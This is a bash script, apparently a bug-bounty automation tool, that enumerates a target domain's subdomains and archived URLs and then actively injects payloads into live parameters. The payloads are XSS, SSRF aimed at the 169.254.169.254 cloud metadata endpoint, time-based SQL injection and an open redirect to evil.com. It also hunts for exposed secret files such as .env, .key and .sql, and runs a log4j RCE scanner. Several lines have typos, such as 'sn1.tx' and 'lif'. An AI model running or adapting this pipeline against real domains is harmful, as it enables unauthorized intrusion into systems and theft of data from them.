#/bin/bash

while getopts ":d:" input;do
    case "$input" in 
            d) domain=${OPTARG}
                    ;;
            esac 
    done        
if [ -z "$domain" ]
        then
                echo "please give a domain like \"-d domain.com\""
                exit 1 
fi



host $domain | anew hostinfo.txt 
dig $domain any | anew diginfo.txt
subfinder -d $domain -o op.txt
assetfinder --subs-only $domain | anew op.txt

amass enum -passive -d $domain | anew op.txt
amass enum -active -d $domain | anew amass_ips.txt
crobat -s $domain | anew amass_ips.txt
cat amass_ips.txt | awk '{print $1}' | anew op.txt

cat op.txt | sort -u | anew all.txt 
cat all.txt | httprobe | anew alive2.txt

cat alive2.txt | sort -u | anew alive.txt
cat alive.txt | jsubfinder | anew sn.txt
echo "checing for sub-domain TakeOver"
subzy -targets all.txt -hide_fails | anew SubdomainTakeover.txt

echo "finding parameter and Next scan for xss"
for i in $(cat all.txt);do ./tools/ParamSpider/paramspider.py -d $i ;done 
cat output/*.txt | sort -u | anew paramspideroutput.txt
rm -rf output
echo "starting Cms Detection"
whatweb -i alive.txt | anew whatweb_op.txt 


dirsearch -u $domain | anew ../../dirseaechfuzz.txt

cd

echo "GF patterns scan" 
mkdir gfpatternsscan

cat alive.txt | waybackurls | sort -u >> waybackdata
cat waybackdata | gf redirect | anew gfpatternsscan/redirectGF.txt 
cat waybackdata | gf xss | anew gfpatternsscan/xssGF.txt
cat waybackdata | gf ssti | anew gfpatternsscan/sstiGF.txt
cat waybackdata | gf sqli | anew gfpatternsscan/sqliGF.txt
cat waybackdata | gf rce |  anew gfpatternsscan/rceGF.txt
cat waybackdata | gf lif | anew gfpatternsscan/lfiGF.txt
cat waybackdata | gf ssrf | anew gfpatternsscan/ssrfparamsGF.txt 


   
cat gfpatternsscan/xssGF.txt | sed "s/'\|(\|)//g" | bhedak "FUZZ" | anew -q xss.txt
cat gfpatternsscan/lfiGF.txt | sed "s/'\|(\|)//g" | bhedak "FUZZ" | anew -q lfi.txt
cat gfpatternsscan/rceGF.txt | sed "s/'\|(\|)//g" | bhedak "FUZZ" | anew -q rce.txt
cat gfpatternsscan/ssrfparamsGF.txt | sed "s/'\|(\|)//g" | bhedak "http://169.254.169.254/latest/meta-data/hostname" | anew -q ssrf.txt
cat gfpatternsscan/sstiGF.txt | sed "s/'\|(\|)//g" | bhedak "FUZZ" | anew -q ssti.txt
cat gfpatternsscan/sqliGF.txt | sed "s/'\|(\|)//g" | bhedak "(select(0)from(select(sleep(5)))v)" | anew -q sqli.txt
cat gfpatternsscan/redirectGF.txt | sed "s/'\|(\|)//g" | bhedak "http://www.evil.com/" | anew -q redirect.txt

 xargs -a gfpatternsscan/xssGF.txt -P 30 -I % bash -c "echo % | kxss" | grep "< >\|\"" | anew -q xss1.txt
 cat xss1.txt | bhedak "\">/><svg/onload=confirm(document.domain)>" | anew -q xss.txt

 cat sn.txt | python3 -c "import sys; import json; print (json.dumps({'vuln_crlf':list(sys.stdin)}))" | sed 's/\\n//g' | tee sn1.txt

 cat sn1.tx | cut -d"?" -f1 | cut -d"=" -f1 | grep -iaE "([^.]+)\.zip$|([^.]+)\.zip\.[0-9]+$|([^.]+)\.zip[0-9]+$|([^.]+)\.zip[a-z][A-Z][0-9]+$|([^.]+)\.zip\.[a-z][A-Z][0-9]+$|([^.]+)\.rar$|([^.]+)\.tar$|([^.]+)\.tar\.gz$|([^.]+)\.tgz$|([^.]+)\.sql$|([^.]+)\.db$|([^.]+)\.sqlite$|([^.]+)\.pgsql\.txt$|([^.]+)\.mysql\.txt$|([^.]+)\.gz$|([^.]+)\.config$|([^.]+)\.log$|([^.]+)\.bak$|([^.]+)\.backup$|([^.]+)\.bkp$|([^.]+)\.crt$|([^.]+)\.dat$|([^.]+)\.eml$|([^.]+)\.java$|([^.]+)\.lst$|([^.]+)\.key$|([^.]+)\.passwd$|([^.]+)\.pl$|([^.]+)\.pwd$|([^.]+)\.mysql-connect$|([^.]+)\.jar$|([^.]+)\.cfg$|([^.]+)\.dir$|([^.]+)\.orig$|([^.]+)\.bz2$|([^.]+)\.old$|([^.]+)\.vbs$|([^.]+)\.img$|([^.]+)\.inf$|([^.]+)\.sh$|([^.]+)\.py$|([^.]+)\.vbproj$|([^.]+)\.mysql-pconnect$|([^.]+)\.war$|([^.]+)\.go$|([^.]+)\.psql$|([^.]+)\.sql\.gz$|([^.]+)\.vb$|([^.]+)\.webinfo$|([^.]+)\.jnlp$|([^.]+)\.cgi$|([^.]+)\.tmp$|([^.]+)\.ini$|([^.]+)\.webproj$|([^.]+)\.xsql$|([^.]+)\.raw$|([^.]+)\.inc$|([^.]+)\.lck$|([^.]+)\.nz$|([^.]+)\.rc$|([^.]+)\.html\.gz$|([^.]+)\.gz$|([^.]+)\.env$|([^.]+)\.yml$" | httpx -silent -follow-host-redirects | anew -q vsanstive.txt
 cat sn1.tx | python3 -c "import sys; import json; print (json.dumps({'sensitive':list(sys.stdin)}))" | sed 's/\\n//g' | tee vsansitive.txt

 xargs -a xss.txt -P 50 -I % bash -c "curl -s -L -H \"X-Bugbounty: Testing\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\" --insecure '%' | grep \"<svg/onload=confirm(document.domain)>\" && echo -e \"[POTENTIAL XSS] - % \n \"" | grep "POTENTIAL XSS" | anew vxss.txt 
   
 cat xss.txt | python3 -c "import sys; import json; print (json.dumps({'vuln_xss':list(sys.stdin)}))" | sed 's/\\n//g' | tee vxss.txt

 xargs -a ssrf.txt -P 50 -I % bash -c "curl -ks -H \"X-Bugbounty: Testing\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\" --insecure '%' | grep \"compute.internal\" && echo -e \"[POTENTIAL SSRF] - % \n \"" | grep "POTENTIAL SSRF" | anew vssrf.txt 
  
 cat ssrf.txt | python3 -c "import sys; import json; print (json.dumps({'vuln_ssrf':list(sys.stdin)}))" | sed 's/\\n//g' | tee vssrf.txt

 xargs -a redirect.txt -P 50 -I % bash -c "curl -s -iL -H \"X-Bugbounty: Testing\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\" --insecure '%' | grep \"Evil.Com - We get it...Daily\" && echo -e \"[POTENTIAL REDIRECT] - % \n \"" | grep "POTENTIAL REDIRECT" | anew redirect.txt 
    
 cat redirect.txt | python3 -c "import sys; import json; print (json.dumps({'vuln_redirect':list(sys.stdin)}))" | sed 's/\\n//g' | tee vredirect.json

 xargs -a sqli.list -P 50 -I % bash -c "echo % | jeeves --payload-time 5" | grep "Vulnerable To" | anew vsqli.txt 
 
 cat sqli.txt | python3 -c "import sys; import json; print (json.dumps({'vuln_redirect':list(sys.stdin)}))" | sed 's/\\n//g' | tee vsqli.txt

  
   

echo "log4jscan but you need to enter burp server" 

root/tools/log4j-RCE-Scanner/./log4j-rce-scanner.sh -l alive -b $burp | anew log4jscan.txt


mkdir wayback_data 
cd wayback_data 
for i in $(cat ../all.txt);do echo $i | waybackurls ;done | anew wb.txt
cat wb.txt | sort -u | grep "=" | anew paramlist.txt

cat wb.txt | grep -p "\w+\.js(\?|$)" | sort -u | anew jsurls.txt

cat wb.txt | grep -p "\w+\.php(\?|$)" | sort -u | anew phpurls.txt

cat wb.txt | grep -p "\w+\.aspx(\?|$)" | sort -u | anew aspxurls.txt

cat wb.txt | grep -p "\w+\.jsp(\?|$)" | sort -u | anew jspurls.txt

cat wb.txt | grep -p "\w+\.txt(\?|$)" | sort -u | anew robots.txt

cd ..











































